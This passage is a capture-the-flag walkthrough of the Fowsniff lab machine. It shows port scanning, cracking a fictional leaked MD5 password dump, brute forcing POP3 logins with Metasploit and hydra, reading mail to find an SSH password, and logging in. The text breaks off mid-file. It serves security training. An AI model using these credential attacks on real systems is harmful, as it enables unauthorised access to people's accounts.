---
Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!
---

![](https://tryhackme-images.s3.amazonaws.com/room-icons/97b218eed9688e9a5cbe136714b86288.jpeg)

This boot2root machine is brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research (its amazing how much information Google can find for you), decoding hashes, brute forcing a pop3 login and much more!

This will be structured to go through what you need to do, step by step. Make sure you are connected to our network

Credit to berzerk0 for creating this machine. This machine is used here with the explicit permission of the creator <3


```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A 10.10.178.83 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 14:07 EDT
Nmap scan report for 10.10.178.83
Host is up (0.20s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Fowsniff Corp - Delivering Solutions
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: RESP-CODES TOP SASL(PLAIN) USER AUTH-RESP-CODE UIDL PIPELINING CAPA
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: capabilities ID IDLE SASL-IR more ENABLE have OK AUTH=PLAINA0001 LOGIN-REFERRALS listed IMAP4rev1 LITERAL+ Pre-login post-login
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/25%OT=22%CT=1%CU=39319%PV=Y%DS=2%DC=T%G=Y%TM=6330992
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%TS=8)SEQ(SP=1
OS:04%GCD=1%ISR=108%TI=Z%TS=8)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT1
OS:1NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68
OS:DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=
OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W
OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUC
OS:K=G%RUD=G)IE(R=N)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   209.41 ms 10.18.0.1
2   209.71 ms 10.10.178.83

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.67 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A 10.10.178.83


google searching

fowsniff pastebin

https://twitter.com/fowsniffcorp?lang=es
https://pastebin.com/378rLnGi

here

https://web.archive.org/web/20200920053052/https://pastebin.com/NrAqVeeX

FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!


mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!

Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!

MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P

l8r n00bz!

B1gN1nj4

-------------------------------------------------------------------------------------------------
This list is entirely fictional and is part of a Capture the Flag educational challenge.

All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.

Any similarities to actual people or entities is purely coincidental and occurred accidentally.


┌──(kali㉿kali)-[~]
└─$ cat fowsniff 
8a28a94a588a95b80163709ab4313aa4
ae1644dac5b77c0cf51e0d26ad6d7e56
1dc352435fecca338acfd4be10984009
19f5af754c31f1e2651edde9250d69bb
90dc16d47114aa13671c697fd506cf26
a92b8a29ef1183192e3d35187e0cfabd
0e9588cb62f4b6f27e33d449e2ba0b3b
4d6e42f56e127803285a0a7649b5ab11
f7fd98d380735e859f8b2ffbbede5a7e

┌──(kali㉿kali)-[~]
└─$ mv fowsniff fowsniff.txt   

using https://hashes.com/en/decrypt/hash

copy the hashes then 

0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever
19f5af754c31f1e2651edde9250d69bb:skyler22
1dc352435fecca338acfd4be10984009:apples01
4d6e42f56e127803285a0a7649b5ab11:orlando12
8a28a94a588a95b80163709ab4313aa4:mailcall
90dc16d47114aa13671c697fd506cf26:scoobydoo2
ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
f7fd98d380735e859f8b2ffbbede5a7e:07011972

so
mauer@fowsniff:mailcall
mustikka@fowsniff:bilbo101
tegel@fowsniff:apples01
baksteen@fowsniff:skyler22
seina@fowsniff:scoobydoo2
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:carp4ever
parede@fowsniff:orlando12
sciana@fowsniff:07011972


┌──(kali㉿kali)-[~]
└─$ nano user.txt          
                                                                                                         
┌──(kali㉿kali)-[~]
└─$ cat user.txt 
mauer
mustikka
tegel
baksteen
seina
stone
murste
parede
sciana

┌──(kali㉿kali)-[~]
└─$ nano pass.txt   
                                                                                                         
┌──(kali㉿kali)-[~]
└─$ cat pass.txt 
mailcall
bilbo101
apples01
skyler22
scoobydoo2
carp4ever
orlando12
07011972


using metasploit

┌──(kali㉿kali)-[~]
└─$ msfconsole              
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.2.18-dev                          ]
+ -- --=[ 2244 exploits - 1185 auxiliary - 398 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Adapter names can be used for IP params 
set LHOST eth0

msf6 > search pop3_login

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/pop3/pop3_login                   normal  No     POP3 Login Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/pop3/pop3_login                                                                                                       

msf6 > use 0
msf6 auxiliary(scanner/pop3/pop3_login) > show options

Module options (auxiliary/scanner/pop3/pop3_login):

   Name              Current Setting             Required  Description
   ----              ---------------             --------  -----------
   BLANK_PASSWORDS   false                       no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                           yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                       no        Try each user/password couple stored in the
                                                           current database
   DB_ALL_PASS       false                       no        Add all passwords in the current database to
                                                            the list
   DB_ALL_USERS      false                       no        Add all users in the current database to the
                                                            list
   DB_SKIP_EXISTING  none                        no        Skip existing credentials stored in the curr
                                                           ent database (Accepted: none, user, user&rea
                                                           lm)
   PASSWORD                                      no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-fram  no        The file that contains a list of probable pa
                     ework/data/wordlists/unix_            sswords.
                     passwords.txt
   RHOSTS                                        yes       The target host(s), see https://github.com/r
                                                           apid7/metasploit-framework/wiki/Using-Metasp
                                                           loit
   RPORT             110                         yes       The target port (TCP)
   STOP_ON_SUCCESS   false                       yes       Stop guessing when a credential works for a
                                                           host
   THREADS           1                           yes       The number of concurrent threads (max one pe
                                                           r host)
   USERNAME                                      no        A specific username to authenticate as
   USERPASS_FILE                                 no        File containing users and passwords separate
                                                           d by space, one pair per line
   USER_AS_PASS      false                       no        Try the username as the password for all use
                                                           rs
   USER_FILE         /usr/share/metasploit-fram  no        The file that contains a list of probable us
                     ework/data/wordlists/unix_            ers accounts.
                     users.txt
   VERBOSE           true                        yes       Whether to print output for all attempts

msf6 auxiliary(scanner/pop3/pop3_login) > set rhost 10.10.178.83
rhost => 10.10.178.83
msf6 auxiliary(scanner/pop3/pop3_login) > set user.txt
[-] Unknown datastore option: user.txt.
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

msf6 auxiliary(scanner/pop3/pop3_login) > set user_file user.txt
user_file => user.txt
msf6 auxiliary(scanner/pop3/pop3_login) > set pass_file pass.txt
pass_file => pass.txt
msf6 auxiliary(scanner/pop3/pop3_login) > run

[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'mauer:mailcall', '-ERR [AUTH] Authentication failed.'
[!] 10.10.178.83:110      - No active DB -- Credential data will not be saved!
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'mauer:bilbo101', '-ERR [AUTH] Authentication failed.'
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'mauer:apples01', '-ERR [AUTH] Authentication failed.'
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'mauer:skyler22', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'mauer:scoobydoo2', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'mauer:carp4ever', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'mauer:orlando12', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'mauer:07011972', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'mustikka:mailcall', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'mustikka:bilbo101', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'mustikka:apples01', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'mustikka:skyler22', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'mustikka:scoobydoo2', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'mustikka:carp4ever', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'mustikka:orlando12', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'mustikka:07011972', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'tegel:mailcall', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'tegel:bilbo101', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'tegel:apples01', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'tegel:skyler22', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'tegel:scoobydoo2', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'tegel:carp4ever', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'tegel:orlando12', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'tegel:07011972', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'baksteen:mailcall', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'baksteen:bilbo101', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'baksteen:apples01', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'baksteen:skyler22', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'baksteen:scoobydoo2', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'baksteen:carp4ever', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'baksteen:orlando12', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'baksteen:07011972', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'seina:mailcall', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'seina:bilbo101', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'seina:apples01', ''
[-] 10.10.178.83:110      - 10.10.178.83:110 - Failed: 'seina:skyler22', ''
[+] 10.10.178.83:110      - 10.10.178.83:110 - Success: 'seina:scoobydoo2' '+OK Logged in.  '


using hydra (faster)

┌──(kali㉿kali)-[~]
└─$ hydra -L user.txt -P pass.txt pop3://10.10.178.83           
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-25 14:56:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 72 login tries (l:9/p:8), ~5 tries per task
[DATA] attacking pop3://10.10.178.83:110/
[110][pop3] host: 10.10.178.83   login: seina   password: scoobydoo2
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-25 14:57:41

telnet or nc

┌──(kali㉿kali)-[~]
└─$ nc 10.10.178.83 110     
+OK Welcome to the Fowsniff Corporate Mail Server!
user seina
+OK
pass scoobydoo2
+OK Logged in.
list
+OK 2 messages:
1 1622
2 1280
.
retr 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone


.
retr 2
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.

.
^C

ssh

baksteen:S1ck3nBluff+secureshell

┌──(kali㉿kali)-[~]
└─$ ssh baksteen@10.10.178.83   
The authenticity of host '10.10.178.83 (10.10.178.83)' can't be established.
ED25519 key fingerprint is SHA256:KZLP3ydGPtqtxnZ11SUpIwqMdeOUzGWHV+c3FqcKYg0.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.178.83' (ED25519) to the list of known hosts.
baksteen@10.10.178.83's password: 

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
baksteen@fowsniff:~$ 
baksteen@fowsniff:~$ id; find / -group users -type f 2>/dev/null
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
/opt/cube/cube.sh
/home/baksteen/.cache/motd.legal-displayed
/home/baksteen/Maildir/dovecot-uidvalidity
/home/baksteen/Maildir/dovecot.index.log
/home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff
/home/baksteen/Maildir/dovecot-uidlist
/home/baksteen/Maildir/dovecot-uidvalidity.5aa21fac
/home/baksteen/.viminfo
/home/baksteen/.bash_history
/home/baksteen/.lesshsQ
/home/baksteen/.bash_logout
/home/baksteen/term.txt
/home/baksteen/.profile
/home/baksteen/.bashrc
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/tasks
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/cgroup.procs
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/tasks
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/cgroup.procs
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/cgroup.clone_children
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/notify_on_release
/proc/1146/task/1146/fdinfo/0
/proc/1146/task/1146/fdinfo/1
/proc/1146/task/1146/fdinfo/2
/proc/1146/task/1146/fdinfo/3
/proc/1146/task/1146/fdinfo/4
/proc/1146/task/1146/fdinfo/5
/proc/1146/task/1146/fdinfo/6
/proc/1146/task/1146/fdinfo/7
/proc/1146/task/1146/fdinfo/8
/proc/1146/task/1146/fdinfo/9
/proc/1146/task/1146/fdinfo/10
/proc/1146/task/1146/fdinfo/11
/proc/1146/task/1146/fdinfo/12
/proc/1146/task/1146/fdinfo/13
/proc/1146/task/1146/fdinfo/14
/proc/1146/task/1146/environ
/proc/1146/task/1146/auxv
/proc/1146/task/1146/status
/proc/1146/task/1146/personality
/proc/1146/task/1146/limits
/proc/1146/task/1146/sched
/proc/1146/task/1146/comm
/proc/1146/task/1146/syscall
/proc/1146/task/1146/cmdline
/proc/1146/task/1146/stat
/proc/1146/task/1146/statm
/proc/1146/task/1146/maps
/proc/1146/task/1146/children
/proc/1146/task/1146/numa_maps
/proc/1146/task/1146/mem
/proc/1146/task/1146/mounts
/proc/1146/task/1146/mountinfo
/proc/1146/task/1146/clear_refs
/proc/1146/task/1146/smaps
/proc/1146/task/1146/pagemap
/proc/1146/task/1146/attr/current
/proc/1146/task/1146/attr/prev
/proc/1146/task/1146/attr/exec
/proc/1146/task/1146/attr/fscreate
/proc/1146/task/1146/attr/keycreate
/proc/1146/task/1146/attr/sockcreate
/proc/1146/task/1146/wchan
/proc/1146/task/1146/stack
/proc/1146/task/1146/schedstat
/proc/1146/task/1146/cpuset
/proc/1146/task/1146/cgroup
/proc/1146/task/1146/oom_score
/proc/1146/task/1146/oom_adj
/proc/1146/task/1146/oom_score_adj
/proc/1146/task/1146/loginuid
/proc/1146/task/1146/sessionid
/proc/1146/task/1146/io
/proc/1146/task/1146/uid_map
/proc/1146/task/1146/gid_map
/proc/1146/task/1146/projid_map
/proc/1146/task/1146/setgroups
/proc/1146/fdinfo/0
/proc/1146/fdinfo/1
/proc/1146/fdinfo/2
/proc/1146/fdinfo/3
/proc/1146/fdinfo/4
/proc/1146/fdinfo/5
/proc/1146/fdinfo/6
/proc/1146/fdinfo/7
/proc/1146/fdinfo/8
/proc/1146/fdinfo/9
/proc/1146/fdinfo/10
/proc/1146/fdinfo/11
/proc/1146/fdinfo/12
/proc/1146/fdinfo/13
/proc/1146/fdinfo/14
/proc/1146/environ
/proc/1146/auxv
/proc/1146/status
/proc/1146/personality
/proc/1146/limits
/proc/1146/sched
/proc/1146/autogroup
/proc/1146/comm
/proc/1146/syscall
/proc/1146/cmdline
/proc/1146/stat
/proc/1146/statm
/proc/1146/maps
/proc/1146/numa_maps
/proc/1146/mem
/proc/1146/mounts
/proc/1146/mountinfo
/proc/1146/mountstats
/proc/1146/clear_refs
/proc/1146/smaps
/proc/1146/pagemap
/proc/1146/attr/current
/proc/1146/attr/prev
/proc/1146/attr/exec
/proc/1146/attr/fscreate
/proc/1146/attr/keycreate
/proc/1146/attr/sockcreate
/proc/1146/wchan
/proc/1146/stack
/proc/1146/schedstat
/proc/1146/cpuset
/proc/1146/cgroup
/proc/1146/oom_score
/proc/1146/oom_adj
/proc/1146/oom_score_adj
/proc/1146/loginuid
/proc/1146/sessionid
/proc/1146/coredump_filter
/proc/1146/io
/proc/1146/uid_map
/proc/1146/gid_map
/proc/1146/projid_map
/proc/1146/setgroups
/proc/1146/timers
/proc/1172/task/1172/fdinfo/0
/proc/1172/task/1172/fdinfo/1
/proc/1172/task/1172/fdinfo/2
/proc/1172/task/1172/fdinfo/255
/proc/1172/task/1172/environ
/proc/1172/task/1172/auxv
/proc/1172/task/1172/status
/proc/1172/task/1172/personality
/proc/1172/task/1172/limits
/proc/1172/task/1172/sched
/proc/1172/task/1172/comm
/proc/1172/task/1172/syscall
/proc/1172/task/1172/cmdline
/proc/1172/task/1172/stat
/proc/1172/task/1172/statm
/proc/1172/task/1172/maps
/proc/1172/task/1172/children
/proc/1172/task/1172/numa_maps
/proc/1172/task/1172/mem
/proc/1172/task/1172/mounts
/proc/1172/task/1172/mountinfo
/proc/1172/task/1172/clear_refs
/proc/1172/task/1172/smaps
/proc/1172/task/1172/pagemap
/proc/1172/task/1172/attr/current
/proc/1172/task/1172/attr/prev
/proc/1172/task/1172/attr/exec
/proc/1172/task/1172/attr/fscreate
/proc/1172/task/1172/attr/keycreate
/proc/1172/task/1172/attr/sockcreate
/proc/1172/task/1172/wchan
/proc/1172/task/1172/stack
/proc/1172/task/1172/schedstat
/proc/1172/task/1172/cpuset
/proc/1172/task/1172/cgroup
/proc/1172/task/1172/oom_score
/proc/1172/task/1172/oom_adj
/proc/1172/task/1172/oom_score_adj
/proc/1172/task/1172/loginuid
/proc/1172/task/1172/sessionid
/proc/1172/task/1172/io
/proc/1172/task/1172/uid_map
/proc/1172/task/1172/gid_map
/proc/1172/task/1172/projid_map
/proc/1172/task/1172/setgroups
/proc/1172/fdinfo/0
/proc/1172/fdinfo/1
/proc/1172/fdinfo/2
/proc/1172/fdinfo/255
/proc/1172/environ
/proc/1172/auxv
/proc/1172/status
/proc/1172/personality
/proc/1172/limits
/proc/1172/sched
/proc/1172/autogroup
/proc/1172/comm
/proc/1172/syscall
/proc/1172/cmdline
/proc/1172/stat
/proc/1172/statm
/proc/1172/maps
/proc/1172/numa_maps
/proc/1172/mem
/proc/1172/mounts
/proc/1172/mountinfo
/proc/1172/mountstats
/proc/1172/clear_refs
/proc/1172/smaps
/proc/1172/pagemap
/proc/1172/attr/current
/proc/1172/attr/prev
/proc/1172/attr/exec
/proc/1172/attr/fscreate
/proc/1172/attr/keycreate
/proc/1172/attr/sockcreate
/proc/1172/wchan
/proc/1172/stack
/proc/1172/schedstat
/proc/1172/cpuset
/proc/1172/cgroup
/proc/1172/oom_score
/proc/1172/oom_adj
/proc/1172/oom_score_adj
/proc/1172/loginuid
/proc/1172/sessionid
/proc/1172/coredump_filter
/proc/1172/io
/proc/1172/uid_map
/proc/1172/gid_map
/proc/1172/projid_map
/proc/1172/setgroups
/proc/1172/timers
/proc/1192/task/1192/fdinfo/0
/proc/1192/task/1192/fdinfo/1
/proc/1192/task/1192/fdinfo/2
/proc/1192/task/1192/fdinfo/3
/proc/1192/task/1192/fdinfo/4
/proc/1192/task/1192/fdinfo/5
/proc/1192/task/1192/fdinfo/7
/proc/1192/task/1192/fdinfo/8
/proc/1192/task/1192/fdinfo/9
/proc/1192/task/1192/fdinfo/10
/proc/1192/task/1192/environ
/proc/1192/task/1192/auxv
/proc/1192/task/1192/status
/proc/1192/task/1192/personality
/proc/1192/task/1192/limits
/proc/1192/task/1192/sched
/proc/1192/task/1192/comm
/proc/1192/task/1192/syscall
/proc/1192/task/1192/cmdline
/proc/1192/task/1192/stat
/proc/1192/task/1192/statm
/proc/1192/task/1192/maps
/proc/1192/task/1192/children
/proc/1192/task/1192/numa_maps
/proc/1192/task/1192/mem
/proc/1192/task/1192/mounts
/proc/1192/task/1192/mountinfo
/proc/1192/task/1192/clear_refs
/proc/1192/task/1192/smaps
/proc/1192/task/1192/pagemap
/proc/1192/task/1192/attr/current
/proc/1192/task/1192/attr/prev
/proc/1192/task/1192/attr/exec
/proc/1192/task/1192/attr/fscreate
/proc/1192/task/1192/attr/keycreate
/proc/1192/task/1192/attr/sockcreate
/proc/1192/task/1192/wchan
/proc/1192/task/1192/stack
/proc/1192/task/1192/schedstat
/proc/1192/task/1192/cpuset
/proc/1192/task/1192/cgroup
/proc/1192/task/1192/oom_score
/proc/1192/task/1192/oom_adj
/proc/1192/task/1192/oom_score_adj
/proc/1192/task/1192/loginuid
/proc/1192/task/1192/sessionid
/proc/1192/task/1192/io
/proc/1192/task/1192/uid_map
/proc/1192/task/1192/gid_map
/proc/1192/task/1192/projid_map
/proc/1192/task/1192/setgroups
/proc/1192/fdinfo/0
/proc/1192/fdinfo/1
/proc/1192/fdinfo/2
/proc/1192/fdinfo/3
/proc/1192/fdinfo/4
/proc/1192/fdinfo/6
/proc/1192/fdinfo/7
/proc/1192/environ
/proc/1192/auxv
/proc/1192/status
/proc/1192/personality
/proc/1192/limits
/proc/1192/sched
/proc/1192/autogroup
/proc/1192/comm
/proc/1192/syscall
/proc/1192/cmdline
/proc/1192/stat
/proc/1192/statm
/proc/1192/maps
/proc/1192/numa_maps
/proc/1192/mem
/proc/1192/mounts
/proc/1192/mountinfo
/proc/1192/mountstats
/proc/1192/clear_refs
/proc/1192/smaps
/proc/1192/pagemap
/proc/1192/attr/current
/proc/1192/attr/prev
/proc/1192/attr/exec
/proc/1192/attr/fscreate
/proc/1192/attr/keycreate
/proc/1192/attr/sockcreate
/proc/1192/wchan
/proc/1192/stack
/proc/1192/schedstat
/proc/1192/cpuset
/proc/1192/cgroup
/proc/1192/oom_score
/proc/1192/oom_adj
/proc/1192/oom_score_adj
/proc/1192/loginuid
/proc/1192/sessionid
/proc/1192/coredump_filter
/proc/1192/io
/proc/1192/uid_map
/proc/1192/gid_map
/proc/1192/projid_map
/proc/1192/setgroups
/proc/1192/timers

baksteen@fowsniff:~$ cd /opt/cube
baksteen@fowsniff:/opt/cube$ cat cube.sh
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
